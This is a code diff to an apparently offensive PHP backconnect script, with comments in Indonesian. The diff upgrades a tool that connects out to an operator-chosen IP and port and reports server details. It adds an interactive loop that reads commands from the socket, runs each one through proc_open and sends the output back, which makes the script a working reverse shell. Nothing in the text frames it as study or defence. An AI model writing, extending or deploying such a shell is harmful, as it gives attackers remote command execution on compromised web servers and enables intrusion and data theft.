@@ -20,7 +20,7 @@ function get_system_info() {
     $info['php_version'] = phpversion();
     $info['safe_mode'] = ini_get('safe_mode') ? 'ON' : 'OFF';
     
-    // IP Server (kompatibel PHP 5.3)
+    // IP Server
     if (isset($_SERVER['SERVER_ADDR'])) {
         $info['server_ip'] = $_SERVER['SERVER_ADDR'];
     } else {
@@ -176,10 +176,96 @@ function send_info() {
     
     $output .= "\n";
     $output .= "\033[1;32m========================================\033[0m\n";
-    $output .= "\033[1;31m            END OF INFO\033[0m\n";
+    $output .= "\033[1;31m      INTERACTIVE SHELL READY\033[0m\n";
     $output .= "\033[1;32m========================================\033[0m\n\n";
     
     return $output;
+}
+
+// Fungsi untuk menjalankan shell interaktif
+function run_interactive_shell($socket) {
+    // Dapatkan direktori kerja awal
+    $cwd = getcwd();
+    $prompt = "\033[1;36m{$cwd}>\033[0m ";
+    fwrite($socket, $prompt);
+    
+    while (!feof($socket)) {
+        // Baca perintah dari client
+        $command = fgets($socket);
+        if ($command === false) {
+            break;
+        }
+        
+        $command = trim($command);
+        
+        // Periksa perintah khusus
+        if ($command === 'exit') {
+            fwrite($socket, "\033[1;31mDisconnecting...\033[0m\n");
+            break;
+        } elseif ($command === '') {
+            // Jika kosong, hanya tampilkan prompt lagi
+            fwrite($socket, $prompt);
+            continue;
+        }
+        
+        // Ubah direktori jika perlu
+        if (strpos($command, 'cd ') === 0) {
+            $path = substr($command, 3);
+            if (empty($path)) {
+                $path = getenv('HOME');
+            }
+            
+            if (@chdir($path)) {
+                $cwd = getcwd();
+                $prompt = "\033[1;36m{$cwd}>\033[0m ";
+                fwrite($socket, $prompt);
+            } else {
+                fwrite($socket, "\033[1;31mcd: {$path}: No such directory\033[0m\n");
+                fwrite($socket, $prompt);
+            }
+            continue;
+        }
+        
+        // Jalankan perintah dan dapatkan output
+        $descriptorspec = array(
+            0 => array("pipe", "r"),  // stdin
+            1 => array("pipe", "w"),  // stdout
+            2 => array("pipe", "w")   // stderr
+        );
+        
+        $process = proc_open($command, $descriptorspec, $pipes, $cwd);
+        
+        if (is_resource($process)) {
+            // Tutup stdin
+            fclose($pipes[0]);
+            
+            // Baca stdout
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            
+            // Baca stderr
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+            
+            // Tutup proses
+            $return_value = proc_close($process);
+            
+            // Kirim output ke client
+            if (!empty($output)) {
+                fwrite($socket, $output);
+            }
+            
+            if (!empty($error)) {
+                fwrite($socket, "\033[1;31m{$error}\033[0m");
+            }
+            
+            // Tampilkan prompt lagi
+            fwrite($socket, $prompt);
+        } else {
+            fwrite($socket, "\033[1;31mFailed to execute command\033[0m\n");
+            fwrite($socket, $prompt);
+        }
+    }
 }
 
 // Fungsi backconnect
@@ -194,8 +280,12 @@ function backconnect($target_ip, $target_port, $reconnect_interval) {
             // Kirim informasi sistem
             $info = send_info();
             fwrite($socket, $info);
+            
+            // Jalankan shell interaktif
+            run_interactive_shell($socket);
+            
             fclose($socket);
-            echo "[*] Informasi terkirim!\n";
+            echo "[*] Koneksi ditutup!\n";
         } else {
             echo "[!] Koneksi gagal: $errstr ($errno)\n";
         }
